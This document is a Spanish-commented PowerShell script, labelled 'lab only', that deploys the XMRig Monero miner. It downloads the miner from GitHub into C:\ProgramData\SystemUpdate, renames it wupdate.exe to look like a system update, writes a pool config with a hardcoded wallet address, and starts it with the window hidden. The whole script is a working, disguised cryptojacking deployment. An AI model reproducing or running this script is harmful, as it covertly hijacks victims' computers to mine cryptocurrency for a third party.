# === DEPLOY XMRig MINERO - Versión 5 (Config sin BOM + ejecución directa) - Lab only ===
$installPath = "C:\ProgramData\SystemUpdate"
New-Item -ItemType Directory -Path $installPath -Force | Out-Null

# Descarga y extrae XMRig
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force

# Copiar y renombrar
$xmrigExe = "$installPath\xmrig-6.25.0\xmrig.exe"
Copy-Item $xmrigExe "$installPath\wupdate.exe" -Force

# Configuración SIN BOM (usamos .NET para escribir UTF-8 puro)
$configContent = @'
{
    "autosave": true,
    "cpu": {
        "max-threads-hint": 50
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ],
    "background": false,
    "log-file": null
}
'@
$configPath = "$installPath\config.json"
[System.IO.File]::WriteAllLines($configPath, $configContent.Split("`n"), [System.Text.Encoding]::UTF8)

# Ejecutar directamente el minero (sin ventana)
$exePath = "$installPath\wupdate.exe"
Start-Process -FilePath $exePath -ArgumentList "-c `"$configPath`"" -WindowStyle Hidden -NoNewWindow

Write-Output "=== Minero lanzado (versión 5 - config corregida) ==="
